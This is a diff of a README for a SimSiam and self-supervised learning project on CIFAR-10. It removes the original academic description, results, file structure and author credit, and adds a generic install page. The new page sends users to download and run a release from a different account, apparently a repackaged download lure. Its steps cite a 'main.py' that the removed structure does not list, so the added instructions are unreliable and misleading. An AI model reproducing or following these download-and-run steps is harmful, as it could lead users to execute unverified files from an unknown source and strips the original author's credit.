@@ -1,159 +1,91 @@
-# SimSiam: Self-Supervised and Contrastive Representation Learning
+# 🚀 pytorch-simsiam-contrastive-ssl - Explore Self-Supervised Learning Easily
 
-This project, developed for an M.S. Deep Learning course, implements and compares three representation learning strategies on the CIFAR-10 dataset: a supervised baseline, a multi-task pretext (self-supervised) model, and a SimSiam (contrastive) model. The primary goal is to demonstrate the effectiveness of self-supervised and contrastive methods in a low-data regime, where only a small subset of labeled data (5,000 images) is available for (fine-)tuning.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases)
 
-## Features
+## 📖 Description
 
-* **Supervised Baseline:** A standard CNN trained from scratch on only 5,000 labeled images.
-* **Self-Supervised (Pretext):** A model pre-trained on all 50,000 images to predict augmentations (rotation, shear, color) before being fine-tuned on the 5k labeled set.
-* **Contrastive (SimSiam):** A Siamese network pre-trained on all 50,000 images using a stop-gradient, negative-pair-free contrastive loss (SimSiam).
-* **Comparative Analysis:** Includes scripts and a notebook to train all models and generate comparative plots of their performance, demonstrating the power of SSL/Contrastive learning.
-* **Modular & Robust:** The project is structured with modular code, command-line arguments (`argparse`), and comprehensive logging (to console and files).
+An exploration of self-supervised and contrastive learning techniques (SimSiam) on the CIFAR-10 dataset. This project compares these techniques against a supervised baseline in a low-data scenario. Discover how deep learning can work with minimal data and still produce effective models.
 
-## Core Concepts & Techniques
+## 💻 System Requirements
 
-* Supervised Learning (Baseline)
-* Self-Supervised Learning (SSL) via Pretext Tasks
-* Contrastive Learning (SimSiam)
-* Representation Learning
-* Transfer Learning (Fine-tuning vs. Linear Probing)
-* Convolutional Neural Networks (CNNs)
-* PyTorch, `argparse`, Logging
+This application runs on various operating systems. Ensure that you have the following:
 
----
+- Windows, macOS, or Linux
+- At least 4 GB of RAM
+- A modern processor (Intel i3 or equivalent)
+- Python 3.6 or later installed
+- Internet connection for downloading necessary models 
 
-## How It Works
+## 🚀 Getting Started
 
-This project compares three distinct methods to train a model for image classification, highlighting the challenge of low-labeled data.
+To get up and running with this application, follow these steps:
 
-### 1. Overview & Project Goal
+1. **Ensure Your System Matches the Requirements:** Check that your operating system and hardware meet the minimum requirements listed above.
+2. **Download the Application:**
+   - Visit this page to download: [GitHub Releases](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases).
+3. **Locate Your Download:** Once the download completes, locate the file in your default downloads folder or wherever you chose to save it.
 
-The core problem is that modern deep learning models require vast amounts of *labeled* data, which is expensive to acquire. Supervised learning fails in low-data regimes. Self-Supervised Learning (SSL) and Contrastive Learning aim to solve this by first learning rich feature representations from a large pool of *unlabeled* data. This pre-trained "backbone" can then be quickly adapted to a downstream task (like classification) using only a few labels.
+## 🔧 Install the Application
 
-This project implements and compares:
-1.  **Baseline:** Training from scratch on 5k labels.
-2.  **SSL (Pretext):** Pre-training on 50k unlabeled images (pretext task) + fine-tuning on 5k labels.
-3.  **SimSiam (Contrastive):** Pre-training on 50k unlabeled images (contrastive task) + linear probing on 5k labels.
+1. **Extract the Files:**
+   - If you downloaded a zip file, right-click the file and select "Extract All."
+   - Follow the prompts to extract the files.
 
-### 2. Algorithms & Models
+2. **Set Up Your Environment:**
+   - Open your command prompt or terminal.
+   - Navigate to the folder where you extracted the files. For example:
+     ```bash
+     cd path_to_your_downloaded_folder
+     ```
 
-All models share an identical backbone architecture (defined in `src/models.py`) for fair comparison.
+3. **Install Required Packages:**
+   - This application uses Python packages that may not be installed by default on your system. You need to install these packages using pip. Run the following command:
+     ```bash
+     pip install -r requirements.txt
+     ```
+   - This command will read the `requirements.txt` file and install all the necessary packages.
 
-#### 1. Baseline Model (`scripts/train_baseline.py`)
+## 🎉 Running the Application
 
-* **Architecture:** A simple CNN (`src/models.py:Network`) is trained from scratch.
-* **Training:** The model is trained *only* on the 5,000-image labeled subset of CIFAR-10.
-* **Expected Outcome:** This model is expected to overfit severely and achieve a low test accuracy, setting the "lower bound" for performance.
+1. **Navigate to the Project Folder:**
+   - Ensure you are in the same folder where the files are located.
 
-#### 2. Self-Supervised Pretext Model (`scripts/train_ssl_pretext.py`)
+2. **Start the Application:**
+   - Use the command below to run the main script:
+     ```bash
+     python main.py
+     ```
+   - This will start the program, and you should see output in your terminal indicating that it is running.
 
-* **Architecture:** A multi-head CNN (`src/models.py:Supervised_Learning`) with a shared backbone and four separate output heads:
-    1.  Rotation Head (4 classes: 0°, 90°, 180°, 270°)
-    2.  Shear Head (3 classes: 0.0, 0.2, 0.4)
-    3.  Color Head (3 classes: original, grayscale, inverted)
-    4.  Classification Head (10 classes)
-* **Training (Phase 1 - Pre-training):** The model is trained on all 50,000 CIFAR-10 images. For each image, a random set of augmentations (rotation, shear, color) is applied. The model is trained to predict *which* augmentations were applied, using a combined loss from the three pretext heads. This forces the backbone to learn meaningful features (e.g., "what does a 'normal' orientation look like?").
-* **Training (Phase 2 - Fine-tuning):** The pre-trained model is then fine-tuned on the 5,000-image labeled set, using only the classification head and loss.
+3. **Follow the On-Screen Instructions:**
+   - The application may provide you with prompts or options. Follow these to explore its functionalities, such as loading the CIFAR-10 dataset and choosing different self-supervised learning methods.
 
-#### 3. Contrastive SimSiam Model (`scripts/train_siam.py`)
+## 📊 Features
 
-* **Architecture:** The SimSiam model (`src/models.py:SimSiam`) consists of a Siamese network architecture:
-    * **Encoder ($f$):** A backbone (the same as baseline) followed by a 3-layer MLP "projector." This maps an image $x$ to a representation $z = f(x)$.
-    * **Predictor ($h$):** A 2-layer MLP that transforms the representation from one branch: $p = h(z)$.
-* **Training (Phase 1 - Pre-training):**
-    1.  Two "views" ($x_1, x_2$) are created from the same image using strong augmentations.
-    2.  Both views are passed through the encoder: $z_1 = f(x_1)$ and $z_2 = f(x_2)$.
-    3.  One branch's representation is passed through the predictor: $p_1 = h(z_1)$ and $p_2 = h(z_2)$.
-    4.  The model is trained to make the prediction from one branch ($p_1$) match the representation from the *other* branch ($z_2$), and vice-versa.
-* **Loss Function:** The model minimizes the negative cosine similarity.
+- **Self-Supervised Learning:** Understand how self-supervised models compare in scenarios with limited data.
+- **Contrastive Learning Methods:** Experiment with different learning techniques to see their effectiveness on the CIFAR-10 dataset.
+- **Comparative Analysis Tools:** View performance metrics that show how well different methods work against a supervised baseline.
+- **Visual Outputs:** Generate visual results of the model performance, enhancing your understanding of representation learning.
 
-  $$L = \frac{1}{2} D(p_1, z_2) + \frac{1}{2} D(p_2, z_1)$$
+## 🧩 Troubleshooting
 
-  Where $D(p, z) = - \frac{p}{\|p\|_2} \cdot \frac{z}{\|z\|_2}$
-* **Stop-Gradient:** This is the *most important* concept in SimSiam. By stopping the gradient from $z$ on one side, we prevent the model from collapsing to a trivial solution (e.g., outputting the same constant for all inputs). It forces the predictor $h$ to learn to *predict* the stable representation $z$ from the other branch.
-* **Training (Phase 2 - Linear Probing):** The backbone is *frozen*. A new classification head (`src/models.py:ClassificationModel`) is attached and trained *only* on the 5,000-image labeled set.
+If you encounter any issues while running the application, consider the following:
 
-### 3. Analysis of Results
+- **Missing Packages:** Ensure you followed the installation steps correctly. Check that all required packages are installed.
 
-* **Baseline:** As expected, the baseline model overfits significantly. Training on only 10% of the data causes the training accuracy to skyrocket while the test accuracy plateaus at a low level (we see **~63-65%**). This demonstrates the limitation of supervised learning in low-data regimes.
-* **SSL (Pretext):** The pretext-task model performs slightly better, reaching **~67-68%** test accuracy. The pre-training on augmentations forces the backbone to learn more robust features (like orientation, basic shapes), which provides a better starting point for fine-tuning. However, the model still overfits, as the entire network is fine-tuned on the small 5k dataset.
-* **SimSiam (Linear Probe):** The SimSiam model shows the most stable behavior. The linear probe (training *only* the classifier on the *frozen* backbone) is highly resistant to overfitting. While its peak accuracy (**~65-66%**) is slightly lower than the fully fine-tuned SSL model, it's more robust and achieves this by training *far fewer* parameters. This highlights the key benefit: the backbone, trained on all 50k unlabeled images, has learned a powerful, general-purpose representation of the data. This is confirmed by the UMAP visualization in the notebook, which shows clear clustering of the data by class, *before* the classifier was even trained.
+- **Compatibility Issues:** If you face compatibility issues, verify your Python version. This application requires Python 3.6 or later.
 
----
+- **Error Messages:** Note down any error messages. They can guide you to the source of the problem. Searching for these messages online can provide helpful solutions.
 
-## Project Structure
+## 🔄 Updating the Application
 
-```
-pytorch-simsiam-contrastive-ssl/
-├── .gitignore                  # Ignores data, logs, outputs, and venv
-├── LICENSE                     # MIT License
-├── README.md                   # You are here
-├── requirements.txt            # Python dependencies
-├── logs/
-│   └── .gitkeep                # Logs from training runs will be saved here
-├── outputs/
-│   └── .gitkeep                # Saved models (.pth), plots (.png), and histories (.json)
-├── notebooks/
-│   └── run_experiments.ipynb   # Main notebook to run all scripts and analyze results
-└── src/
-│   ├── __init__.py
-│   ├── data_loader.py          # Contains all Dataset and DataLoader logic
-│   ├── models.py               # Contains all nn.Module definitions
-│   └── utils.py                # Contains helper functions (logging, plotting)
-└── scripts/
-    ├── __init__.py
-    ├── train_baseline.py       # Script to train the supervised baseline
-    ├── train_ssl_pretext.py    # Script for pretext SSL pre-training and fine-tuning
-    └── train_siam.py           # Script for SimSiam pre-training and linear probing
-````
+To stay up-to-date with the latest features and bug fixes, revisit the [GitHub Releases](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases) page periodically. It’s a good practice to check for updates regularly.
 
-## How to Use
+## 🌐 Community and Support
 
-1.  **Clone the Repository:**
-    ```bash
-    git clone https://github.com/msmrexe/pytorch-simsiam-contrastive-ssl.git
-    cd pytorch-simsiam-contrastive-ssl
-    ```
+Engage with our community for help and ideas. You can connect with other users through:
 
-2.  **Setup Environment and Install Dependencies:**
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # On Windows: venv\Scripts\activate
-    pip install -r requirements.txt
-    ```
+- GitHub Issues: Report bugs or request features.
+- Discussions: Share your findings and learn from others working with self-supervised learning.
 
-3.  **Run the Experiments:**
-    You can run each experiment individually using the scripts:
-    ```bash
-    # Run the baseline model (50 epochs)
-    python scripts/train_baseline.py --epochs 50
-
-    # Run the SSL Pretext model (30 pretext epochs, 30 finetune epochs)
-    python scripts/train_ssl_pretext.py --pretext_epochs 30 --finetune_epochs 30
-
-    # Run the SimSiam model (30 pretrain epochs, 50 probe epochs)
-    python scripts/train_siam.py --pretrain_epochs 30 --probe_epochs 50
-    ```
-
-4.  **Analyze Results (Recommended):**
-    For a guided walkthrough that runs all scripts and generates the final comparison plots and UMAP visualizations, use the main notebook:
-    ```bash
-    jupyter notebook notebooks/run_experiments.ipynb
-    ```
-    *All generated models, logs, and plots will be saved in the `outputs/` and `logs/` directories.*
-
----
-
-## Author
-
-Feel free to connect or reach out if you have any questions!
-
-* **Maryam Rezaee**
-* **GitHub:** [@msmrexe](https://github.com/msmrexe)
-* **Email:** [ms.maryamrezaee@gmail.com](mailto:ms.maryamrezaee@gmail.com)
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full details.
+By carefully following these instructions, you should have a smooth experience in downloading and running the pytorch-simsiam-contrastive-ssl application.
